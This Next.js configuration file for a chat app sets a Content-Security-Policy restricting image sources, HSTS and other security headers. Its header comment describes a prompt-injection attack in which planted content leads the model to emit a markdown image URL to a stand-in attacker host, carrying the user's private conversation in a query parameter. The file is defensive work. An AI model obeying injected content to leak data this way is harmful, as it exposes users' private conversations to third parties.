import "./src/env.mjs";
import { withSentryConfig } from "@sentry/nextjs";

/**
 * Close the prompt-injection image-exfiltration channel with a Content-Security-Policy.
 *
 * THE VECTOR. Model output is rendered as markdown. There is no raw-HTML/JS
 * passthrough (rehype-raw is deliberately absent), so a malicious document,
 * pasted text, or retrieved web page cannot make the browser run script or call
 * fetch()/XHR/WebSocket. The ONE channel the model's text CAN make the browser
 * hit an arbitrary host on its own is an image: `![](https://attacker/?d=…)`
 * auto-loads, and `?d=…` carries whatever the injection told the model to encode
 * about the user's private conversation. `safeImageUrl` used to permit any https
 * host, so this was open.
 *
 * THE BOUNDARY. `img-src` is restricted to the app's own origin plus data:/blob:
 * (and the Convex storage origin, which is where legitimate attachment, artifact
 * and avatar images actually live). An external image URL in model output simply
 * does not load, so there is no request to the attacker's host.
 *
 * DELIBERATELY NARROW. Only `img-src` is set — there is NO `default-src`, so
 * scripts, styles, fonts and especially `connect-src` (the load-bearing Convex
 * WebSocket, which the whole app depends on) stay completely unrestricted. This
 * closes the one channel the model controls without risking the transport. The
 * few defensive response headers below are the uncontroversial ones that cannot
 * break a same-origin SPA.
 */
function imgSrc() {
  const extra = new Set();
  const convex = process.env.NEXT_PUBLIC_CONVEX_URL;
  if (convex) {
    try {
      extra.add(new URL(convex).origin);
    } catch {
      // ignore a malformed build-time value; 'self' still covers same-origin.
    }
  }
  return ["'self'", "data:", "blob:", ...extra].join(" ");
}

const securityHeaders = [
  {
    key: "Content-Security-Policy",
    value: `img-src ${imgSrc()}`,
  },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "X-Frame-Options", value: "SAMEORIGIN" },
  /**
   * HSTS. Production served none at all — verified with `curl -I` against
   * app.ollasuper.com — and Cloudflare was not supplying one either, so a first
   * visit or a hostile network could still be downgraded to http and the session
   * cookie read off the wire.
   *
   * SET HERE, NOT AT THE CLOUDFLARE EDGE, and that is deliberate. The edge
   * setting is ZONE-WIDE, and this zone is not ours alone: the apex, `www` and
   * `tokens.` serve other properties, and the zone carries live mail records.
   * Turning on zone-wide HSTS would impose it on hosts this project does not
   * own. A response header set by our own app binds the browser to
   * app.ollasuper.com only — and HSTS is a PER-HOST policy, so one header on any
   * response from this host also covers /__cvx* on it, which is the part
   * next.config.mjs otherwise cannot reach.
   *
   * NO `includeSubDomains` and NO `preload`: both widen the blast radius beyond
   * this host, which is exactly what the zone-sharing above rules out. Two years
   * is the usual max-age once the host is HTTPS-only, and it is.
   */
  {
    key: "Strict-Transport-Security",
    value: "max-age=63072000",
  },
];

/** @type {import('next').NextConfig} */
const nextConfig = {
  transpilePackages: ["@v1/ui", "@v1/backend", "@v1/analytics", "@v1/logger"],
  async headers() {
    return [{ source: "/:path*", headers: securityHeaders }];
  },
  /**
   * /favicon.ico serves the real mark instead of an HTML page.
   *
   * The icon is now app/icon.svg, and Next emits a <link rel="icon"> pointing at
   * it, so current browsers never ask for /favicon.ico. Some clients and crawlers
   * still do, by convention — and with public/favicon.ico deleted that request
   * fell through the router and 307'd to /chat. Measured on production before
   * this rewrite: `HTTP/1.1 307` with `content-type: text/html`, which is a worse
   * answer than either an icon or a 404.
   *
   * A rewrite, not a redirect, so the bytes are served at the requested URL.
   */
  async rewrites() {
    return [{ source: "/favicon.ico", destination: "/icon.svg" }];
  },
};

// Only wrap when a DSN is actually configured.
//
// withSentryConfig injects the SDK into every client bundle whether or not it
// can report anything, and production builds here set NEXT_PUBLIC_SENTRY_DSN
// to an empty string (deploy/05-build-apps.sh). Measured on the deployed build:
// 317KB raw / 93KB gzip, 31% of the /chat bundle, downloaded, parsed and
// executed for nothing. The sentry.*.config.ts files and instrumentation.ts are
// deliberately left untouched, so setting a DSN restores the previous behaviour
// exactly.
export default process.env.NEXT_PUBLIC_SENTRY_DSN
  ? withSentryConfig(nextConfig, {
    silent: !process.env.CI,
    telemetry: false,
    widenClientFileUpload: true,
    hideSourceMaps: true,
    disableLogger: true,
    tunnelRoute: "/monitoring",
    })
  : nextConfig;
